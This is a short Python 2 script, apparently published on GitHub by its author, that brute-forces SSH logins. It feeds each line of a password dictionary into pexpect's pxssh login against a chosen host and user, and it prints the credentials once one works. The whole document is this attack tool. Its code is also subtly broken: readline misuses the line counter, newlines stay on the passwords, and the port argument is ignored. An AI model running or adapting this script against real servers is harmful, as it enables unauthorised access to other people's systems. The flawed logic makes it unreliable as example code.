__autor__ = 'AstralCam'

import os
import argparse
from pexpect import pxssh
import getpass

def main():
    parser  = argparse.ArgumentParser()
    parser.add_argument("-H", "--hostname", help="host a conectar")
    parser.add_argument("-p", "--port", help="puerto del host")
    parser.add_argument("-u", "--user", help="usuario del host")
    parser.add_argument("-d", "--passwords", help="diccionario")

    args = parser.parse_args()

    while True:
        os.system('clear')
        print "SSH Force Brute Python"

        try:
            f = open(args.passwords, "r")

        except:
            print "No se pudo abrir el archivo "
            closeFile = False
            exit()
        
        closeFile = True
        
        line = 1
        while True:
            try:                                                         
                s = pxssh.pxssh()
                hostname = args.hostname
                username = args.user
                password = f.readline(line) 
                port = args.port

                print "\nintentando con: '" + password + "'..."

                s.login (hostname, username, password)

                os .system("clear")
                print "credenciales decifradas!!! \n"
                print "[" + hostname+ "]{" 
                print "  usuario: " + username
                print "  contrasena: " + password
                print "}\n"
                raw_input()
                
                s.logout()
                exit()
            
            except pxssh.ExceptionPxssh, e:
                print "Incorrecto"
                print str(e)
                
                line = line + 1

    if closeFile == True:
        f.close()





 ###########################
 #                         #
 # Creado por AstralCam :D #    <--- LEER :P 
 #  github.com/AstralCam   #
 #                         #
 ###########################






if __name__=='__main__':
    main() 
